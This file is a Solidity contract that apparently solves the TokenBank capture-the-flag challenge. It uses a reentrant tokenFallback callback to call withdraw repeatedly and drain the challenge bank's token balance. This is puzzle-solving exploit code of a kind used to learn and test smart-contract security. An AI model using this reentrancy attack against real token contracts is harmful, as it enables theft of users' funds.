pragma solidity ^0.4.21;

import './challenge.sol';

contract TokenBankChallengeSolver {

    TokenBankChallenge c;

    constructor(address tokenBankAddress) {
        c = TokenBankChallenge(tokenBankAddress);
    }

    function attack(uint256 amount) public {
        c.token().transfer(address(c), amount);
        c.withdraw(amount);
    }

    function tokenFallback(address from, uint256 value, bytes data) external {
        uint256 myBalance = c.balanceOf(address(this));
        if (myBalance > 0 && c.token().balanceOf(address(c)) >= myBalance) {
            c.withdraw(myBalance);
        }
    }
}